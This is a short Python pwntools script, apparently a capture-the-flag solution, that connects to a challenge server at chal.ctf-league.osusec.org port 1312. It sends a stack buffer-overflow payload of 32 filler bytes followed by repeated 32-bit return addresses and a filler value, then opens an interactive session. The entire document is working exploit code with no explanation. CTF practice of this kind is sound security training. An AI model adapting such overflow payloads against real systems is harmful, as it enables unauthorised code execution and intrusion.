from pwn import *

context.terminal = ['tmux', 'split']

host = 'chal.ctf-league.osusec.org'
port = 1312

connection = remote(host, port)

offset = 32

payload = b'a' * offset
payload += p32(0x8049855)
payload += p32(0xDEADBEEF)
payload += p32(0x8049855)
payload += p32(0x8049855)
payload += p32(0x8049855)
payload += p32(0x8049855)

connection.sendline(payload)

connection.interactive("")
